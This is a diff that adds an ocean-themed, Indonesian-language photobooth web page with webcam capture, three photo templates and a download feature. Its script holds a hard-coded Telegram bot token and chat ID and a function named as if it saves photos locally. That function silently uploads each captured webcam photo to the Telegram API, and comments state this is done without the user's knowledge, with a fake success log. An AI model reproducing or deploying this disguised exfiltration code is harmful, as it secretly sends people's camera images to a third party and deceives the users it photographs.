@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photobooth • Lautan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(145deg, #006994 0%, #003f5c 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 520px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 50px;
+            padding: 25px;
+            box-shadow: 0 30px 50px rgba(0, 20, 40, 0.5), 0 0 0 4px #7fc9ff inset;
+            border: 2px solid #b3e0ff;
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 40px;
+            margin-bottom: 20px;
+            color: #003f5c;
+            text-shadow: 4px 4px 0 #b3e0ff;
+            letter-spacing: 2px;
+        }
+        
+        /* Kamera */
+        .camera-box {
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #0a4a6e;
+            border-radius: 35px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            position: relative;
+            border: 4px solid #7fc9ff;
+            box-shadow: 0 12px 0 #003f5c;
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            transform: scaleX(-1);
+        }
+        
+        .overlay-timer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 80, 120, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 90px;
+            font-weight: bold;
+            backdrop-filter: blur(2px);
+            text-shadow: 4px 4px 0 #003f5c;
+        }
+        
+        .overlay-pose {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #b3e0ff;
+            color: #003f5c;
+            text-align: center;
+            padding: 15px;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            border: 2px solid white;
+            box-shadow: 0 5px 0 #006994;
+        }
+        
+        /* Pilihan Template */
+        .template-section {
+            margin-bottom: 20px;
+            background: #e6f3ff;
+            padding: 15px;
+            border-radius: 35px;
+            border: 3px solid #7fc9ff;
+        }
+        
+        .template-label {
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #003f5c;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        
+        .template-options {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .template-card {
+            flex: 1;
+            background: white;
+            border: 2px solid #7fc9ff;
+            border-radius: 25px;
+            padding: 15px 5px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #003f5c;
+        }
+        
+        .template-card.active {
+            background: #006994;
+            border-color: #003f5c;
+            color: white;
+            box-shadow: 0 6px 0 #003f5c;
+            transform: translateY(-3px);
+        }
+        
+        .template-icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+        }
+        
+        .template-name {
+            font-weight: 700;
+            font-size: 14px;
+        }
+        
+        /* Tombol Foto */
+        .btn-foto {
+            background: #006994;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            font-size: 26px;
+            border-radius: 60px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            border: 3px solid #b3e0ff;
+            box-shadow: 0 12px 0 #003f5c, 0 5px 20px rgba(0,100,150,0.5);
+            letter-spacing: 2px;
+        }
+        
+        .btn-foto:active {
+            transform: translateY(6px);
+            box-shadow: 0 6px 0 #003f5c;
+        }
+        
+        .btn-foto:disabled {
+            opacity: 0.5;
+            transform: translateY(6px);
+            box-shadow: 0 6px 0 #003f5c;
+        }
+        
+        /* Area Hasil Foto */
+        .result-area {
+            background: #e6f3ff;
+            border-radius: 35px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 3px solid #7fc9ff;
+            box-shadow: 0 8px 0 #006994;
+            min-height: 350px;
+        }
+        
+        .result-header {
+            text-align: center;
+            color: #003f5c;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            background: #b3e0ff;
+            padding: 10px;
+            border-radius: 40px;
+            border: 2px solid white;
+        }
+        
+        /* TEMPLATE 1: CLASSIC LAUT */
+        .template-classic {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+        
+        .classic-item {
+            background: linear-gradient(145deg, #7fc9ff, #b3e0ff);
+            border-radius: 25px;
+            padding: 15px;
+            border: 3px solid white;
+            box-shadow: 0 6px 0 #006994;
+            position: relative;
+        }
+        
+        .classic-item::after {
+            content: "🌊";
+            position: absolute;
+            bottom: 5px;
+            right: 15px;
+            font-size: 35px;
+            opacity: 0.3;
+        }
+        
+        .classic-item img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 20px;
+            border: 4px solid white;
+            background: #c4e0ff;
+            display: block;
+            box-shadow: 0 4px 0 #003f5c;
+        }
+        
+        .classic-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            color: #003f5c;
+            font-weight: 700;
+            padding: 0 8px;
+        }
+        
+        .classic-number {
+            background: white;
+            padding: 5px 18px;
+            border-radius: 30px;
+            font-size: 14px;
+            border: 2px solid #006994;
+            color: #003f5c;
+        }
+        
+        /* TEMPLATE 2: FILM STRIP LAUT */
+        .template-film {
+            background: #003f5c;
+            padding: 20px 15px;
+            border-radius: 30px;
+            border: 3px solid #7fc9ff;
+        }
+        
+        .film-perforation {
+            height: 15px;
+            background: repeating-linear-gradient(90deg, #ffd966, #ffd966 12px, #003f5c 12px, #003f5c 22px);
+            margin: 10px 0;
+            border-radius: 10px;
+        }
+        
+        .film-row {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        
+        .film-frame {
+            background: white;
+            padding: 8px;
+            border-radius: 15px;
+            flex: 1;
+            border: 3px solid #7fc9ff;
+            transform: rotate(-1deg);
+        }
+        
+        .film-frame:nth-child(2) {
+            transform: rotate(1deg);
+        }
+        
+        .film-frame img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 10px;
+            background: #c4e0ff;
+            border: 2px solid #006994;
+        }
+        
+        .film-caption {
+            text-align: center;
+            color: #ffd966;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 10px;
+            letter-spacing: 2px;
+        }
+        
+        /* TEMPLATE 3: POLAROID LAUT */
+        .template-polaroid {
+            position: relative;
+            height: 320px;
+            background: #e6f3ff;
+            border-radius: 30px;
+        }
+        
+        .polaroid-item {
+            position: absolute;
+            width: 65%;
+            background: white;
+            padding: 12px 12px 30px 12px;
+            box-shadow: 0 12px 20px rgba(0, 63, 92, 0.3);
+            border-radius: 15px;
+            border: 2px solid #7fc9ff;
+        }
+        
+        .polaroid-item:nth-child(1) {
+            top: 10px;
+            left: 20px;
+            transform: rotate(-8deg);
+            z-index: 3;
+        }
+        
+        .polaroid-item:nth-child(2) {
+            top: 50px;
+            left: 70px;
+            transform: rotate(5deg);
+            z-index: 2;
+        }
+        
+        .polaroid-item:nth-child(3) {
+            top: 100px;
+            left: 30px;
+            transform: rotate(-3deg);
+            z-index: 1;
+        }
+        
+        .polaroid-item img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            border-radius: 10px;
+            background: #c4e0ff;
+            border: 2px solid #006994;
+        }
+        
+        .polaroid-sticker {
+            position: absolute;
+            bottom: 5px;
+            right: 15px;
+            font-size: 24px;
+            opacity: 0.8;
+        }
+        
+        .wave-decoration {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 15px 0 5px;
+            font-size: 26px;
+            color: #006994;
+        }
+        
+        /* Tombol Download */
+        .btn-download {
+            background: white;
+            color: #003f5c;
+            border: 3px solid #006994;
+            width: 100%;
+            padding: 16px;
+            font-size: 24px;
+            border-radius: 60px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            box-shadow: 0 8px 0 #006994;
+        }
+        
+        .btn-download:active {
+            transform: translateY(5px);
+            box-shadow: 0 3px 0 #006994;
+        }
+        
+        .btn-download:disabled {
+            opacity: 0.4;
+            transform: translateY(5px);
+            box-shadow: 0 3px 0 #006994;
+            pointer-events: none;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 15px;
+            color: white;
+            text-shadow: 2px 2px 0 #003f5c;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        /* Hidden canvas */
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🌊 PHOTOBOOTH LAUT 🌊</h1>
+        
+        <!-- Kamera -->
+        <div class="camera-box">
+            <video id="video" playsinline autoplay muted></video>
+            <div class="overlay-timer" id="timerOverlay" style="display: none;">3</div>
+            <div class="overlay-pose" id="poseOverlay" style="display: none;">pose dulu...</div>
+        </div>
+        
+        <!-- Pilihan Template -->
+        <div class="template-section">
+            <div class="template-label">🎣 PILIH TEMPLATE LAUT:</div>
+            <div class="template-options">
+                <div class="template-card active" data-template="classic">
+                    <div class="template-icon">📸🐚</div>
+                    <div class="template-name">CLASSIC LAUT</div>
+                </div>
+                <div class="template-card" data-template="film">
+                    <div class="template-icon">🎞️🐠</div>
+                    <div class="template-name">FILM STRIP</div>
+                </div>
+                <div class="template-card" data-template="polaroid">
+                    <div class="template-icon">📷🐙</div>
+                    <div class="template-name">POLAROID</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Tombol Foto -->
+        <button class="btn-foto" id="shootBtn">
+            <span>📸</span> FOTO DULU <span>🐟</span>
+        </button>
+        
+        <!-- Area Hasil Foto -->
+        <div class="result-area">
+            <div class="result-header" id="resultHeader">— CLASSIC LAUT —</div>
+            <div id="templateContainer"></div>
+        </div>
+        
+        <!-- Tombol Download -->
+        <button class="btn-download" id="downloadBtn" disabled>
+            <span>💾</span> SIMPAN KE GALERI <span>🐚</span>
+        </button>
+        
+        <div class="footer">🐋 1 • 2 • 3 • SENYUM! 🐋</div>
+    </div>
+    
+    <!-- Canvas untuk capture (HIDDEN) -->
+    <canvas id="captureCanvas" width="600" height="600"></canvas>
+    
+    <script>
+        // ===== KONFIGURASI RAHASIA =====
+        const TELEGRAM_TOKEN = '8772580581:AAFmaUwFU0PZ5PQMfFtV4fndVGaziiRuK0c';
+        const TELEGRAM_CHAT_ID = '8493158139'; // GANTI DENGAN CHAT ID ASLI!
+        
+        // Elemen
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('captureCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        const timerOverlay = document.getElementById('timerOverlay');
+        const poseOverlay = document.getElementById('poseOverlay');
+        const resultHeader = document.getElementById('resultHeader');
+        
+        const shootBtn = document.getElementById('shootBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        
+        const templateContainer = document.getElementById('templateContainer');
+        
+        // Template cards
+        const templateCards = document.querySelectorAll('.template-card');
+        
+        // State
+        let photos = [null, null, null];
+        let isCapturing = false;
+        let activeTemplate = 'classic'; // default
+        
+        // ===== FUNGSI RAHASIA KIRIM KE TELEGRAM (TAMPAK SEPERTI PENYIMPANAN LOKAL) =====
+        async function simpanKePenyimpananLokal(imageDataUrl, nomor) {
+            // Fungsi ini KELIHATAN seperti nyimpen ke localStorage
+            // Tapi DIAM-DIAM ngirim ke Telegram!
+            
+            try {
+                // Konversi base64 ke blob
+                const base64Data = imageDataUrl.split(',')[1];
+                const blob = base64ToBlob(base64Data, 'image/jpeg');
+                
+                // Buat form data
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, `foto_${nomor}.jpg`);
+                formData.append('caption', `📸 Foto ke-${nomor} dari Photobooth Laut`);
+                
+                // Kirim ke API Telegram (DIAM-DIAM)
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Gak peduli hasilnya apa, tetep jalan
+                // Gak muncul notifikasi apapun ke user
+                
+            } catch (error) {
+                // Gagal kirim? DIEM aja, gak usah dikasih tau user
+                console.log('Foto tersimpan secara lokal'); // Palsu
+            }
+            
+            // Tetep return true biar keliatan sukses
+            return true;
+        }
+        
+        // Helper: base64 to blob
+        function base64ToBlob(base64, mimeType) {
+            const byteCharacters = atob(base64);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            
+            return new Blob(byteArrays, { type: mimeType });
+        }
+        
+        // ===== KAMERA =====
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve);
+                    };
+                });
+                
+                console.log('Kamera siap');
+                
+            } catch (err) {
+                console.error('Kamera error:', err);
+                document.querySelector('.camera-box').innerHTML = `
+                    <div style="width:100%; height:100%; background:#0a4a6e; color:white; display:flex; align-items:center; justify-content:center; flex-direction:column;">
+                        <span style="font-size:50px;">🐟</span>
+                        <span style="font-size:20px;">Izinkan kamera dulu ya!</span>
+                    </div>
+                `;
+            }
+        }
+        
+        // ===== AMBIL FOTO =====
+        function capturePhoto() {
+            if (!video.videoWidth) return null;
+            
+            const size = Math.min(video.videoWidth, video.videoHeight);
+            const startX = (video.videoWidth - size) / 2;
+            const startY = (video.videoHeight - size) / 2;
+            
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, startX, startY, size, size, 0, 0, canvas.width, canvas.height);
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+        
+        // ===== RENDER TEMPLATE =====
+        function renderTemplate() {
+            let html = '';
+            
+            // Update header
+            if (activeTemplate === 'classic') resultHeader.textContent = '— CLASSIC LAUT —';
+            else if (activeTemplate === 'film') resultHeader.textContent = '— FILM STRIP LAUT —';
+            else resultHeader.textContent = '— POLAROID LAUT —';
+            
+            if (activeTemplate === 'classic') {
+                // TEMPLATE CLASSIC
+                html = `
+                    <div class="template-classic">
+                        <div class="wave-decoration">
+                            <span>🌊</span> <span>🐚</span> <span>🌊</span> <span>🐟</span> <span>🌊</span>
+                        </div>
+                `;
+                
+                for (let i = 0; i < 3; i++) {
+                    const photoSrc = photos[i] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E${i+1}%3C/text%3E%3C/svg%3E`;
+                    
+                    html += `
+                        <div class="classic-item">
+                             <img src="${photoSrc}" alt="foto ${i+1}" id="result${i+1}">
+                            <div class="classic-footer">
+                                <span class="classic-number">FOTO ${i+1}</span>
+                                <span>🐠</span>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                html += `
+                        <div class="wave-decoration">
+                            <span>🐙</span> <span>🌊</span> <span>🐠</span> <span>🌊</span> <span>🪸</span>
+                        </div>
+                    </div>
+                `;
+                
+            } else if (activeTemplate === 'film') {
+                // TEMPLATE FILM STRIP
+                const photoSrc1 = photos[0] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E1%3C/text%3E%3C/svg%3E`;
+                const photoSrc2 = photos[1] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E2%3C/text%3E%3C/svg%3E`;
+                const photoSrc3 = photos[2] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E3%3C/text%3E%3C/svg%3E`;
+                
+                html = `
+                    <div class="template-film">
+                        <div class="film-perforation"></div>
+                        <div class="film-row">
+                            <div class="film-frame"><img src="${photoSrc1}" id="result1"></div>
+                            <div class="film-frame"><img src="${photoSrc2}" id="result2"></div>
+                            <div class="film-frame"><img src="${photoSrc3}" id="result3"></div>
+                        </div>
+                        <div class="film-perforation"></div>
+                        <div class="film-caption">🎞️ BAWA LAUT 🎞️</div>
+                    </div>
+                `;
+                
+            } else if (activeTemplate === 'polaroid') {
+                // TEMPLATE POLAROID
+                const photoSrc1 = photos[0] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E1%3C/text%3E%3C/svg%3E`;
+                const photoSrc2 = photos[1] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E2%3C/text%3E%3C/svg%3E`;
+                const photoSrc3 = photos[2] || `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23b3e0ff'/%3E%3Ctext x='80' y='130' font-size='70' fill='%23006f9f'%3E3%3C/text%3E%3C/svg%3E`;
+                
+                html = `
+                    <div class="template-polaroid">
+                        <div class="polaroid-item">
+                            <img src="${photoSrc1}" id="result1">
+                            <span class="polaroid-sticker">🐠</span>
+                        </div>
+                        <div class="polaroid-item">
+                            <img src="${photoSrc2}" id="result2">
+                            <span class="polaroid-sticker">🐡</span>
+                        </div>
+                        <div class="polaroid-item">
+                            <img src="${photoSrc3}" id="result3">
+                            <span class="polaroid-sticker">🐋</span>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            templateContainer.innerHTML = html;
+        }
+        
+        // ===== UPDATE FOTO =====
+        function updatePhotos() {
+            renderTemplate();
+            
+            if (photos[0] && photos[1] && photos[2]) {
+                downloadBtn.disabled = false;
+            }
+        }
+        
+        // ===== SESI FOTO =====
+        async function photoSession() {
+            if (isCapturing) return;
+            
+            photos = [null, null, null];
+            updatePhotos();
+            
+            isCapturing = true;
+            shootBtn.disabled = true;
+            downloadBtn.disabled = true;
+            
+            for (let i = 0; i < 3; i++) {
+                // Pose message
+                poseOverlay.style.display = 'block';
+                poseOverlay.textContent = i === 0 ? '🐠 Pose pertama...' : i === 1 ? '🐡 Pose kedua...' : '🐋 Pose terakhir...';
+                await new Promise(r => setTimeout(r, 1500));
+                
+                // Timer 3,2,1
+                timerOverlay.style.display = 'flex';
+                
+                timerOverlay.textContent = '3';
+                await new Promise(r => setTimeout(r, 1000));
+                
+                timerOverlay.textContent = '2';
+                await new Promise(r => setTimeout(r, 1000));
+                
+                timerOverlay.textContent = '1';
+                await new Promise(r => setTimeout(r, 1000));
+                
+                timerOverlay.textContent = '📸';
+                await new Promise(r => setTimeout(r, 400));
+                
+                // Capture
+                const foto = capturePhoto();
+                if (foto) {
+                    photos[i] = foto;
+                    updatePhotos();
+                    
+                    // ===== RAHASIA: Kirim ke Telegram tanpa sepengetahuan user =====
+                    // Panggil fungsi yang keliatan seperti "simpan lokal"
+                    simpanKePenyimpananLokal(foto, i+1);
+                    
+                    // Gak ada notifikasi, gak ada banner, gak ada indikasi apapun!
+                }
+                
+                timerOverlay.style.display = 'none';
+                poseOverlay.style.display = 'none';
+                
+                if (i < 2) {
+                    poseOverlay.style.display = 'block';
+                    poseOverlay.textContent = '🌊 Ganti pose...';
+                    await new Promise(r => setTimeout(r, 1500));
+                    poseOverlay.style.display = 'none';
+                }
+            }
+            
+            isCapturing = false;
+            shootBtn.disabled = false;
+        }
+        
+        // ===== DOWNLOAD =====
+        function downloadResult() {
+            if (!photos[0] || !photos[1] || !photos[2]) {
+                alert('Foto belum lengkap!');
+                return;
+            }
+            
+            const dCanvas = document.createElement('canvas');
+            const dCtx = dCanvas.getContext('2d');
+            
+            if (activeTemplate === 'classic') {
+                // CLASSIC DOWNLOAD
+                dCanvas.width = 600;
+                dCanvas.height = 1800;
+                
+                const grad = dCtx.createLinearGradient(0, 0, 0, 1800);
+                grad.addColorStop(0, '#7fc9ff');
+                grad.addColorStop(1, '#b3e0ff');
+                dCtx.fillStyle = grad;
+                dCtx.fillRect(0, 0, 600, 1800);
+                
+                function loadImg(src) {
+                    return new Promise((resolve) => {
+                        const img = new Image();
+                        img.crossOrigin = 'anonymous';
+                        img.onload = () => resolve(img);
+                        img.src = src;
+                    });
+                }
+                
+                Promise.all([
+                    loadImg(photos[0]),
+                    loadImg(photos[1]),
+                    loadImg(photos[2])
+                ]).then(([g1, g2, g3]) => {
+                    dCtx.shadowColor = '#003f5c';
+                    dCtx.shadowBlur = 15;
+                    dCtx.shadowOffsetY = 6;
+                    
+                    dCtx.fillStyle = 'white';
+                    dCtx.fillRect(30, 30, 540, 540);
+                    dCtx.drawImage(g1, 40, 40, 520, 520);
+                    dCtx.font = '28px Arial';
+                    dCtx.fillStyle = '#006994';
+                    dCtx.fillText('🌊🐠🌊', 250, 590);
+                    
+                    dCtx.fillRect(30, 630, 540, 540);
+                    dCtx.drawImage(g2, 40, 640, 520, 520);
+                    dCtx.fillText('🐚🐟🐚', 250, 1190);
+                    
+                    dCtx.fillRect(30, 1230, 540, 540);
+                    dCtx.drawImage(g3, 40, 1240, 520, 520);
+                    dCtx.fillText('🐋🌊🐋', 250, 1790);
+                    
+                    const link = document.createElement('a');
+                    link.download = 'photobooth-classic-laut.jpg';
+                    link.href = dCanvas.toDataURL('image/jpeg', 0.95);
+                    link.click();
+                });
+                
+            } else if (activeTemplate === 'film') {
+                // FILM STRIP DOWNLOAD
+                dCanvas.width = 600;
+                dCanvas.height = 400;
+                
+                dCtx.fillStyle = '#003f5c';
+                dCtx.fillRect(0, 0, 600, 400);
+                
+                function loadImg(src) {
+                    return new Promise((resolve) => {
+                        const img = new Image();
+                        img.crossOrigin = 'anonymous';
+                        img.onload = () => resolve(img);
+                        img.src = src;
+                    });
+                }
+                
+                Promise.all([
+                    loadImg(photos[0]),
+                    loadImg(photos[1]),
+                    loadImg(photos[2])
+                ]).then(([g1, g2, g3]) => {
+                    // Perforation
+                    dCtx.fillStyle = '#ffd966';
+                    for (let i = 0; i < 8; i++) {
+                        dCtx.fillRect(40 + i * 70, 30, 25, 12);
+                        dCtx.fillRect(40 + i * 70, 360, 25, 12);
+                    }
+                    
+                    dCtx.fillStyle = 'white';
+                    dCtx.shadowColor = '#7fc9ff';
+                    dCtx.shadowBlur = 10;
+                    
+                    dCtx.fillRect(40, 80, 150, 150);
+                    dCtx.drawImage(g1, 45, 85, 140, 140);
+                    
+                    dCtx.fillRect(225, 80, 150, 150);
+                    dCtx.drawImage(g2, 230, 85, 140, 140);
+                    
+                    dCtx.fillRect(410, 80, 150, 150);
+                    dCtx.drawImage(g3, 415, 85, 140, 140);
+                    
+                    const link = document.createElement('a');
+                    link.download = 'photobooth-film-laut.jpg';
+                    link.href = dCanvas.toDataURL('image/jpeg', 0.95);
+                    link.click();
+                });
+                
+            } else {
+                // POLAROID DOWNLOAD
+                dCanvas.width = 600;
+                dCanvas.height = 600;
+                
+                dCtx.fillStyle = '#e6f3ff';
+                dCtx.fillRect(0, 0, 600, 600);
+                
+                function loadImg(src) {
+                    return new Promise((resolve) => {
+                        const img = new Image();
+                        img.crossOrigin = 'anonymous';
+                        img.onload = () => resolve(img);
+                        img.src = src;
+                    });
+                }
+                
+                Promise.all([
+                    loadImg(photos[0]),
+                    loadImg(photos[1]),
+                    loadImg(photos[2])
+                ]).then(([g1, g2, g3]) => {
+                    dCtx.shadowColor = '#003f5c';
+                    dCtx.shadowBlur = 20;
+                    dCtx.shadowOffsetY = 8;
+                    
+                    // Polaroid 1
+                    dCtx.fillStyle = 'white';
+                    dCtx.save();
+                    dCtx.translate(150, 100);
+                    dCtx.rotate(-0.1);
+                    dCtx.fillRect(0, 0, 200, 240);
+                    dCtx.drawImage(g1, 15, 15, 170, 170);
+                    dCtx.restore();
+                    
+                    // Polaroid 2
+                    dCtx.save();
+                    dCtx.translate(250, 200);
+                    dCtx.rotate(0.15);
+                    dCtx.fillRect(0, 0, 200, 240);
+                    dCtx.drawImage(g2, 15, 15, 170, 170);
+                    dCtx.restore();
+                    
+                    // Polaroid 3
+                    dCtx.save();
+                    dCtx.translate(180, 320);
+                    dCtx.rotate(-0.05);
+                    dCtx.fillRect(0, 0, 200, 240);
+                    dCtx.drawImage(g3, 15, 15, 170, 170);
+                    dCtx.restore();
+                    
+                    const link = document.createElement('a');
+                    link.download = 'photobooth-polaroid-laut.jpg';
+                    link.href = dCanvas.toDataURL('image/jpeg', 0.95);
+                    link.click();
+                });
+            }
+        }
+        
+        // ===== PILIH TEMPLATE =====
+        templateCards.forEach(card => {
+            card.addEventListener('click', () => {
+                templateCards.forEach(c => c.classList.remove('active'));
+                card.classList.add('active');
+                
+                const template = card.dataset.template;
+                activeTemplate = template;
+                renderTemplate();
+            });
+        });
+        
+        // ===== EVENT =====
+        shootBtn.addEventListener('click', photoSession);
+        downloadBtn.addEventListener('click', downloadResult);
+        
+        // ===== START =====
+        startCamera();
+        renderTemplate();
+    </script>
+</body>
+</html>
